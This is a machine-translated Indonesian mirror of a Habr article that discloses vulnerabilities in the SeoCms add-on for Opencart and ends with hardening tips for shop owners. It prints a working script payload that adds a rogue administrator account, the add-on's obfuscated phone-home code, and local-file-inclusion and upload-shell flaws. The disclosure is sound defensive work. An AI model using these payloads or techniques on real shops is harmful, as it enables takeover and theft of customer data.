<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ¦Œ ğŸ§ğŸ» ğŸ§’ğŸ½ Opencartforum dan teman-teman ğŸš¶ğŸ¼ â›³ï¸ ğŸ‘¨ğŸ¿â€ğŸ¤â€ğŸ‘¨ğŸ¾</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Semua anjing masuk surga, dan semua pemilik toko online di Opencart, cepat atau lambat di Opencartforum. Ketika euforia dari pemasangan pertama mesin ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Opencartforum dan teman-teman</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/466283/"><img src="https://habrastorage.org/webt/i_/fm/jp/i_fmjpfeqs4zmi1axxwqrczafv0.jpeg" alt="gambar"><br><br>  Semua anjing masuk surga, dan semua pemilik toko online di Opencart, cepat atau lambat di Opencartforum.  Ketika euforia dari pemasangan pertama mesin pada hosting melewati dan kenyataan pahit dimulai, pemilik toko biasanya mulai kehilangan sesuatu dan dia memulai jalan yang sulit untuk menemukan kontraktor yang berkualitas dan add-on berkualitas untuk tokonya. <br><br>  Sumber daya terbesar di Runet, tempat Anda dapat menemukan keduanya, adalah opencartforum.com, yang saat ini memiliki lebih dari 140 ribu pengguna terdaftar.  Dari pendaftaran 140 ribu ini, bahkan setengahnya adalah orang-orang yang hidup dengan toko-toko langsung yang menggunakan templat atau modul yang dapat segera dibeli di situs.  Dan semua orang ini bahkan tidak menyadari bahwa bersama dengan add-on yang mereka peroleh adalah backdoor dan kerentanan yang luar biasa, yang hanya bisa diimpikan oleh hacker ibu mana pun. <br><a name="habracut"></a><br>  Meskipun dalam bentuk deklaratif dalam aturan untuk mengirim pengaya di toko forum, hitam dan putih ditulis.  Kami memiliki departemen qad, orang-orang yang terlatih khusus memeriksa add-on untuk kerentanan. <br><br>  Dan baik forum, sebagai platform yang memediasi antara penulis dan pengguna akhir dari add-on, maupun penulis add-on, ternyata, tidak bertanggung jawab. <br>  Bagaimana bisa begitu?  Dan begitu!  Ternyata secara historis. <br><br>  Memodelkan bagi diri saya sendiri konsekuensi hipotetis dari insiden itu, yang akan dibahas kemudian, rambut saya di kepala saya berdiri. <br><br>  Bayangkan saja.  Anda adalah pemilik toko yang sukses, belum tidur di malam hari selama beberapa tahun, menulis teks, menggigit hitam, putih, abu-abu seo, bertarung panda, minusinsk, tidak menghabiskan minuman Anda, menarik 100.000 pelanggan, berinvestasi dalam posisi.  Anak-anak Anda pergi ke taman kanak-kanak yang baik, dan kemudian tiba-tiba penjualan Anda turun setengahnya, hanya karena basis Anda dengan semua kontak yang dihubungi pelanggan menjadi pesaing.  Atau tiba-tiba Anda benar-benar kehilangannya, karena selama sebulan toko Anda telah bekerja di server mysql orang lain, dan Anda bahkan tidak melihat perubahan kofig, dan semua cadangan di hosting menjadi buruk. <br><br>  Mereka mempresentasikan perasaan mereka dalam situasi yang sama, bekerja, bekerja selama beberapa tahun, dan dalam satu hari semuanya sia-sia.  Anda berkata, ini tidak mungkin demikian. <br><br>  Tapi itu bisa sangat mudah.  Cukup dengan membeli add-on dengan "perlindungan" perlindungan yang tidak diucapkan yang tidak diumumkan terhadap penggunaan yang tidak sah, dan data Anda dapat dengan cepat menjadi orang asing! <br><br><h2>  Insiden pertama </h2><br>  Enam bulan lalu, satu toko dicegah secara dangkal ketika laporan pemindai Ai-Bol menunjukkan peringatan aneh untuk kode aneh dalam modul <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">SeoCms</a> (lebih dari 10.000 instalasi aktif). <br><br>  Kami mulai melihat lebih dekat dan ternyata abracadabra ini hanya cukup menampilkan versi add-on: <br><br><pre><code class="php hljs">$text_redaeh_stpo = $text_redaeh_stpo_1.$value_tnega.$text_redaeh_stpo_2.$text_redaeh_stpo_3.$text_reda eh_stpo_4.$text_redaeh_stpo_5.$text_redaeh_stpo_6.$text_redaeh_stpo_7.$text_redaeh _stpo_8.$text_redaeh_stpo_9.$value_revres.$text_redaeh_stpo_10; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($date_diff &gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) { $ver_content = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $opts = <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>( $text_ptth =&gt; <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($text_dohtem =&gt;$text_tsop, $redaeh =&gt;$text_redaeh_stpo, $tnetnoc =&gt; $yreuq_dliub_ptth(<span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($text_rdda =&gt;$value_rdda, $text_liame =&gt; <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;data[<span class="hljs-string"><span class="hljs-string">'liame'</span></span>], $text_rev=&gt;<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;data[<span class="hljs-string"><span class="hljs-string">'blog_version'</span></span>] )))); $context = $etaerc_txetnoc_maerts($opts); $exceptionizer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PHP_Exceptionizer(E_ALL); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { $ver_content = $stnetnoc_teg_elif($rev_knil, <span class="hljs-keyword"><span class="hljs-keyword">FALSE</span></span> , $context); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (E_WARNING $e) { <span class="hljs-comment"><span class="hljs-comment">//echo "Warning or better raised: " . $e-&gt;getMessage(); } $this-&gt;model_setting_setting-&gt;editSetting('blog_ver', Array('blog_version_date' =&gt; $date_current, 'blog_version_content' =&gt; $ver_content )); } if ($this-&gt;data['blog_version']!=$ver_content) { $this-&gt;data['text_new_version'] = $this-&gt;language-&gt;get('text_new_version').$ver_content. " &lt;span style='color: #000; font-weight: normal;'&gt;(".$date_ver_update.")&lt;/span&gt;". $this-&gt;language-&gt;get('text_new_version_end'); } else { $this-&gt;data['text_new_version'] = ''; }</span></span></code> </pre> <br>  Tidak apa-apa kecuali itu: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;language-&gt;get(<span class="hljs-string"><span class="hljs-string">'text_new_version'</span></span>).$ver_content. <span class="hljs-string"><span class="hljs-string">" &lt;span style='color: #000; font-weight: normal;'&gt;("</span></span>.$date_ver_update.<span class="hljs-string"><span class="hljs-string">")&lt;/span&gt;"</span></span></code> </pre><br>  itu tidak difilter dengan cara apa pun, dan jika secara tidak sengaja skrip seperti yang ada di bawah ini masuk bukan versi klien, mendapatkan akses admin ke toko mana pun di mana modul dipasang adalah masalah waktu dan teknik. <br><br><pre> <code class="php hljs">&lt;script&gt; <span class="hljs-comment"><span class="hljs-comment">// shell sample // seocms the best architectural mistake forever // i got all your 10 000 shops // i install 10 000 backdors functionâ€‹ getUrlVarsâ€‹()â€‹ {â€‹ vâ€‹arâ€‹vars=â€‹â€‹[â€‹],â€‹hash,â€‹â€‹hashes=â€‹â€‹nâ€‹ull;â€‹ iâ€‹fâ€‹â€‹(wâ€‹indowâ€‹.lâ€‹ocation.â€‹hâ€‹refâ€‹.iâ€‹ndexOf(â€‹"â€‹?"â€‹)â€‹â€‹&amp;&amp; windowâ€‹.â€‹location.â€‹hâ€‹ref.â€‹â€‹indexOfâ€‹("â€‹&amp;")â€‹)â€‹â€‹{ hashes =â€‹ windowâ€‹.â€‹location.â€‹hâ€‹ref.â€‹â€‹sliceâ€‹(wâ€‹indowâ€‹.lâ€‹ocationâ€‹.hâ€‹refâ€‹.iâ€‹ndexOfâ€‹(â€‹"?"â€‹)â€‹â€‹+ 1)â€‹.â€‹split(â€‹â€‹"&amp;"â€‹); }â€‹â€‹â€‹elseâ€‹iâ€‹fâ€‹â€‹(wâ€‹indowâ€‹.lâ€‹ocation.â€‹hâ€‹refâ€‹.â€‹indexOf(â€‹â€‹"?"â€‹))â€‹â€‹{ hashes =â€‹ windowâ€‹.â€‹location.â€‹hâ€‹ref.â€‹â€‹sliceâ€‹(wâ€‹indowâ€‹.â€‹locationâ€‹.hâ€‹refâ€‹.iâ€‹ndexOfâ€‹(â€‹"?"â€‹)â€‹â€‹+â€‹â€‹1â€‹); }â€‹ iâ€‹fâ€‹ â€‹(hâ€‹ashes!â€‹=â€‹nâ€‹ull)â€‹ â€‹{â€‹ fâ€‹orâ€‹â€‹(vâ€‹arâ€‹iâ€‹=â€‹â€‹0;â€‹â€‹iâ€‹&lt;â€‹hashesâ€‹.â€‹lengthâ€‹;â€‹iâ€‹++)â€‹{â€‹ hash=â€‹â€‹hashes[â€‹â€‹i]â€‹.sâ€‹plitâ€‹(â€‹"=")â€‹; vars[â€‹hâ€‹ashâ€‹[0â€‹]â€‹]â€‹â€‹=â€‹hashâ€‹[â€‹1]â€‹; }â€‹ }â€‹ râ€‹eturnâ€‹vars;â€‹ } varâ€‹ url_vars =â€‹ â€‹ getUrlVarsâ€‹(); varâ€‹ token =â€‹ â€‹ url_vars.â€‹ â€‹tokenâ€‹; varâ€‹ host â€‹=â€‹ window.â€‹ â€‹locationâ€‹.â€‹origin;â€‹ varâ€‹action=â€‹â€‹host+â€‹â€‹"â€‹/admin/index.php?route=user/user/add&amp;token="â€‹+â€‹ token;â€‹ document.â€‹ â€‹addEventListenerâ€‹(â€‹"DOMContentLoaded"â€‹,â€‹ â€‹functionâ€‹(â€‹eventâ€‹)â€‹ â€‹{ $â€‹.pâ€‹ost(â€‹â€‹action,â€‹â€‹{â€‹â€‹usernameâ€‹:â€‹â€‹"Hack123"â€‹,â€‹user_group_idâ€‹:â€‹â€‹"1"â€‹, firstnameâ€‹:â€‹"â€‹Lol",â€‹â€‹lastnameâ€‹:â€‹"â€‹Haha"â€‹,â€‹ emailâ€‹:â€‹â€‹"Hack123@Hack123.com"â€‹, password:â€‹â€‹"â€‹1234",â€‹â€‹ confirmâ€‹:â€‹â€‹"1234"â€‹,â€‹ statusâ€‹:â€‹â€‹"1"â€‹â€‹}â€‹â€‹); }); &lt;/script&gt;</span></span></code> </pre><br>  Detail situasi dijelaskan di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> .  Pemberitahuan administrasi di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> . <br><br>  Mungkin yang kelima kalinya, setelah memodelkan proses ini dengan sangat jelas untuk administrasi forum, adalah mungkin untuk menyampaikan kekritisan situasi. <br><br>  Dan administrasi, pada gilirannya, secara resmi memberi tahu pengguna tentang keberadaan kerentanan ini, dan tampaknya bahkan membuat buletin kepada pelanggan.  Tetapi ini tidak akurat. <br><br>  Mari kita tinggalkan di belakang layar ancaman dan penghindaran penulis add-on dan kembali dua bulan lagi ... <br><br><h2>  Insiden kedua </h2><br>  Toko lain datang untuk diperiksa, di mana ada jalur liar hingga 3-4 detik di setiap halaman.  Kita mulai membedah dan melihat dalam folder dengan cache 20k + file dengan ekstensi .php.  Cache file dengan ekstensi php Karl, itu bukan kebetulan! <br><br>  Kami melihat struktur data dari file-file ini, dan ada lagi potongan-potongan modul SEOCMS kami yang indah. <br><br>  Dan metode yang bagus: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $ajax_file = DIR_CACHE.base64_decode(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;db-&gt;escape(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;get[<span class="hljs-string"><span class="hljs-string">"ajax_file"</span></span>])); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists($ajax_file)) { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ajax_file_cached; }</code> </pre> <br>  Ini adalah contoh kerentanan klasik - Sertakan File Lokal. <br><br>  Cukup dengan kode di base64 ../....../config.php dan halo - memerlukan ($ ajax_file);  Dan tolong: di sini Anda memiliki kata sandi dari database, dan di sini adalah log kesalahan sistem, dan jika bahkan / etc / pwd sangat diperlukan, meskipun sudah lama tidak relevan, yah, bagaimana jika? <br><br>  Dan berapa banyak hoster dan server dengan pengaturan default yang bersinar di dunia phpmyadmin?  Setengah?  Lebih? <br><br>  Kita mulai melihat lebih jauh dan apa yang kita temukan?  Kode unduhan avatar yang luar biasa: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!$json) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (is_uploaded_file(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;files[<span class="hljs-string"><span class="hljs-string">'file'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>]) &amp;&amp; file_exists(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;files[<span class="hljs-string"><span class="hljs-string">'file'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>])) { $file = basename($filename) . <span class="hljs-string"><span class="hljs-string">'.'</span></span> . md5(substr(sha1(uniqid(mt_rand(), <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>)); $file_original = basename($filename); <span class="hljs-comment"><span class="hljs-comment">// Hide the uploaded file name so people can not link to it directly. //$json['file'] = $this-&gt;encryption-&gt;encrypt($file); // To remove highload from the file system, when large number of buyers $avatar_dir = 'data/avatars/'.(ceil ($this-&gt;data['customer_id'] / 300)) * 300; move_uploaded_file($this-&gt;request-&gt;files['file']['tmp_name'], DIR_IMAGE . $file); $new_filename = $avatar_dir.'/'.$this-&gt;data['customer_id']."_".utf8_strtolower($file_original); if (isset($this-&gt;data['thislist']['avatar_width']) &amp;&amp; $this-&gt;data['thislist']['avatar_width']!='') { $width = $this-&gt;data['thislist']['avatar_width']; } else { if (isset($this-&gt;data['generallist']['avatar_width']) &amp;&amp; $this-&gt;data['generallist']['avatar_width']!='') { $width = $this-&gt;data['generallist']['avatar_width']; } else { $width = '100'; } } if (isset($this-&gt;data['thislist']['avatar_height']) &amp;&amp; $this-&gt;data['thislist']['avatar_height']!='') { $height = $this-&gt;data['thislist']['avatar_height']; } else { if (isset($this-&gt;data['generallist']['avatar_height']) &amp;&amp; $this-&gt;data['generallist']['avatar_height']!='') { $height = $this-&gt;data['generallist']['avatar_height']; } else { $height = '100'; } } $this-&gt;load-&gt;model('tool/image'); $json['file'] = $avatar_thumb = $this-&gt;model_tool_image-&gt;resizeavatar($file, $new_filename , $width, $height, true, false); if (trim($avatar_thumb)=='') { $json['error'] = $this-&gt;language-&gt;get('error_upload'); } if ($file!='' &amp;&amp; file_exists(DIR_IMAGE . $file)) { unlink (DIR_IMAGE . $file); } } }</span></span></code> </pre> <br>  Yang sempurna jatuh ke dalam kesalahan ketika mencoba untuk mengubah ukuran (dan menunjukkan kita path lengkap ke file yang diunduh), setelah memuat beberapa jenis shell.php.png, dan kemudian juga dieksekusi dengan sempurna oleh metode sebelumnya. <br><br>  Video eksploitasi kerentanan (dengan output kesalahan sistem php dihidupkan): <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/SdyW8OzAfZI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  Video eksploitasi kerentanan (dengan output kesalahan sistem php dimatikan): <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/f-JYKzT_WAk" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  Analisis kode dilakukan pada versi modul 52 pada bulan April 2019. <br><br>  Karena penulis dan administrasi forum diberitahu pada tanggal yang sama, cukup waktu berlalu bagi mereka untuk mengambil semua tindakan yang mungkin untuk memberi tahu pembeli tentang penghapusan kerentanan, kami, dengan hati nurani yang jelas, dapat mengungkapkan semua detail. <br><br>  Dan pada saat itu, sesuatu terjadi.  Di server pengembang ada modulnya sendiri.  Tetapi kerentanan itu tidak berhasil.  Dia tertutup ... Dan ini adalah keanehan besar.  Sangat besar !!! <br><br>  Dan keanehan kedua dari keseluruhan cerita ini adalah bahwa opencartforum dalam pribadi administrasi dan departemen untuk kontrol kualitas add-ons tidak melihat insiden pertama atau kedua, dan dalam kedua kasus pada notifikasi pertama tidak menemukan sesuatu yang kritis. <br><br>  Tentu saja tidak ada yang penting ketika konfigurasi Anda bersinar di dunia.  Tidak ada yang penting ketika setengah dari pemilik toko tidak menyadari apa yang sedang terjadi di bawah tenda mereka.  Lagi pula, mereka pernah, seseorang memasang pengaya ini, dan tanpa mengirim surat, mereka bahkan tidak menyadari bahwa seluruh bisnis berada di bawah ancaman langsung. <br><br>  Dan jika ada reaksi yang berbeda dari administrasi pada insiden pertama, maka pada posting kedua semua dengan menyebutkan itu dihapus.  Dan semua ini dicakup oleh <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">tawaran forum</a> , yang menurutnya, tentang penambahan komersial, komentar dapat dibiarkan tentang orang mati - baik atau tidak sama sekali. <br><br>  Penulis juga mengklaim bahwa kesalahan dan lubang sudah diperbaiki, qadepartment melewatkan add-on untuk dijual, tetapi tidak, lubang tidak diperbaiki ... <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!class_exists(<span class="hljs-string"><span class="hljs-string">'PHP_Exceptionizer'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (function_exists(<span class="hljs-string"><span class="hljs-string">'modification'</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">require_once</span></span>(modification(DIR_SYSTEM . <span class="hljs-string"><span class="hljs-string">'library/exceptionizer.php'</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">require_once</span></span>(DIR_SYSTEM . <span class="hljs-string"><span class="hljs-string">'library/exceptionizer.php'</span></span>); } } $exceptionizer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PHP_Exceptionizer(E_ALL); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $filename = preg_replace(<span class="hljs-string"><span class="hljs-string">'/[^a-zA-Z0-9\.\-\s+]/'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, html_entity_decode(base64_decode(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;db-&gt;escape(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;get[<span class="hljs-string"><span class="hljs-string">'ajax_file'</span></span>])), ENT_QUOTES, <span class="hljs-string"><span class="hljs-string">'UTF-8'</span></span>)); $ajax_file = DIR_CACHE . $filename; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists($ajax_file)) { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { ob_start(); <span class="hljs-keyword"><span class="hljs-keyword">require</span></span>($ajax_file); $ajax_html = ob_get_contents(); ob_end_clean(); header(<span class="hljs-string"><span class="hljs-string">'Content-type: text/html; charset=utf-8'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $ajax_html; <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;deletecache(<span class="hljs-string"><span class="hljs-string">'cache.ajax'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ajax_file_cached; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (E_WARNING $e) { } }</code> </pre> <br>  memerlukan () masih di sini.  Masukan sedikit disaring.  Tapi potensi LFI hidup dan hidup.  Jika sedikit lagi, maka ya, sekarang kita tidak dapat memuat atau mengeksekusi shell.  Tetapi misalkan kita mencoba, menutup, memperkuat pelaksanaan skrip apa pun kecuali index.php, dan bahkan pada tingkat konfigurasi nginx, yang tidak dapat diakses.  Tetapi di suatu tempat di tempat lain, peretas jahat mendapat kesempatan untuk menempatkan file sewenang-wenang di folder cache.  Apa yang akan terjadi  Itu benar - untuk mengeksekusi kode asing, menghasilkan hash dalam permintaan dapatkan, dibutuhkan dua menit.  Artinya, pada akhirnya ternyata, itu seperti ditutup, tapi sepertinya tidak sepenuhnya. <br><br>  Nah, hal-hal kecil: bagaimana hubungan yang begitu indah bersinar dalam file bahasa: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>]) &amp;&amp; (strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'on'</span></span> || $_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>] == <span class="hljs-string"><span class="hljs-string">'1'</span></span>)) || (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_PROTO'</span></span>]) &amp;&amp; (strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_PROTO'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'https'</span></span>) || (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_SSL'</span></span>]) &amp;&amp; strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_SSL'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'on'</span></span>))) { $_[<span class="hljs-string"><span class="hljs-string">'value_revres'</span></span>] = HTTPS_SERVER; $_[<span class="hljs-string"><span class="hljs-string">'value_ctlg'</span></span>] = HTTPS_CATALOG; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { $_[<span class="hljs-string"><span class="hljs-string">'value_revres'</span></span>] = HTTP_SERVER; $_[<span class="hljs-string"><span class="hljs-string">'value_ctlg'</span></span>] = HTTP_CATALOG; }</code> </pre> <br>  Dan mereka bersinar ... Anda ingin tahu jalan penuh ke akar proyek.  Temukan saja toko dengan tampilan kesalahan dihidupkan dan jalankan tautan langsung ke file bahasa. <br><br>  Untuk mempelajari apa lagi yang bisa dilakukan setelah memperbarui add-on dalam megabyte baris kode penulis - tidak ada sumber daya maupun keinginan.  Ada orang-orang yang bertanggung jawab yang dilatih khusus untuk ini. <br><br>  Dan ceri di atas kue.  Kami ingat, kami memiliki pengaya komersial ... Dan dalam pengaya komersial kami memiliki teks tersembunyi di sumber penulis: <br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">www.google.com/search?q=%22Powered+by+SEO+CMS%22</a> </blockquote><br>  Menariknya, setidaknya salah satu pembeli tambahan tahu tentang telur paskah yang "luar biasa"? <br><br>  Hari ini, suplemen dijual dan dijual.  Posting dengan panggilan untuk memperhatikan situasi hanya dihapus.  Tidak ada pembeli yang menerima pemberitahuan peringatan tentang insiden kedua.  Mungkin 20-30% dari pengguna add-on telah diperbarui, tetapi 70% - bahkan jika kita berbicara tentang statistik penulis resmi tentang penggunaan add-on, ini adalah 7000 toko (pada kenyataannya, lebih banyak - karena tidak ada yang tahu pasti berapa banyak salinan yang dipasang oleh freelancer di toko klien. lisensi diperpanjang) berada di zona risiko besar. <br><br>  Dalam kata-kata Baron Munchausen, saya hanya ingin mengatakan satu hal: Tuan-tuan yang diperbarui! <br><br><h2>  Untuk pelanggan </h2><br>  Apa yang harus dilakukan, mereka yang berakhir di kapal selam yang tenggelam ini: <br><br><ul><li>  Jangan tinggalkan sampah di ftp.  Lihat info.php, adminer.php, dan semua sampah lainnya.  Anda seharusnya hanya memiliki index.php dan sebuah titik. </li><li>  Ubah kata sandi secara teratur, semua kata sandi (ftp, panel admin, database).  Dan pastikan Anda tidak sengaja memiliki akun aneh tambahan. </li><li>  Nonaktifkan output kesalahan.  Selalu, jika Anda tidak bekerja, matikan output kesalahan pada tingkat konfigurasi juru dan tidak dalam pengaturan toko. </li><li>  Ya, saya tahu ini tidak terlalu layak, tetapi Anda setidaknya harus tetap up to date dengan pembaruan kode mesin yang terkait dengan keamanan, dan idealnya, secara teratur memperbarui mesin ke versi stabil. </li><li>  Secara teratur melihat log kunjungan, mungkin ada banyak hal menarik.  Lacak anomali. </li><li>  Tutup juga dengan kata sandi atau batasan pada admin ip toko dan berbagai bagian yang rentan, seperti phpmyadmin.  Jika ini adalah berbagi di mana phpmyadmin adalah hal umum bagi semua orang, larilah dari hosting semacam itu! </li><li>  Jika Anda menggunakan sxd dan utilitas serupa, segera ganti namanya menjadi kumpulan karakter acak. </li><li>  Saat menggunakan nginx, ada baiknya menambahkan aturan ke konfigurasi virtual host yang melarang menjalankan skrip php selain index.php di bagian root dan admin situs. </li><li>  Jangan membuang sampah dari akun Anda.  Jika Anda memiliki toko, maka biarkanlah itu toko.  Jangan memuat di bawah satu akun banyak wp-blog, setumpuk bug dan berbagai domain uji. </li><li>  Jangan pernah menyimpan cadangan situs atau basis data di root host virtual Anda. </li><li>  Perhatikan muatan di server / hosting, cobalah untuk menjaga persediaan setidaknya x2 dari beban puncak, dan jika tiba-tiba beban tiba-tiba meningkat tanpa alasan, coba cari tahu alasannya.  Lebih baik menyalip daripada tidak menyelesaikan! </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id466283/">https://habr.com/ru/post/id466283/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id466263/index.html">Sistem RPC Benchmark (dan Inverted Json)</a></li>
<li><a href="../id466267/index.html">Mengapa banyak yang meremehkan game mereka</a></li>
<li><a href="../id466271/index.html">Kursus Bersama Group-IB dan Belkasoft: apa yang kami ajarkan dan siapa yang akan datang</a></li>
<li><a href="../id466279/index.html">Sebagian besar perangkat Android rentan terhadap serangan phishing melalui SMS</a></li>
<li><a href="../id466281/index.html">Realitas maya, permainan sumber terbuka, dan mobil listrik: apa yang dikatakan John Carmack di podcast Joe Rogan</a></li>
<li><a href="../id466285/index.html">Sebuah freebie kecil: undian combo dvr dan detektor radar</a></li>
<li><a href="../id466287/index.html">2019 Segmen Riset & Laporan Keandalan Segmen Internet Nasional</a></li>
<li><a href="../id466289/index.html">Inisiatif legislatif. Aneh, tetapi diperkenalkan ke Duma Negara</a></li>
<li><a href="../id466291/index.html">Survei Keberlanjutan Segmen Internet Nasional untuk 2019</a></li>
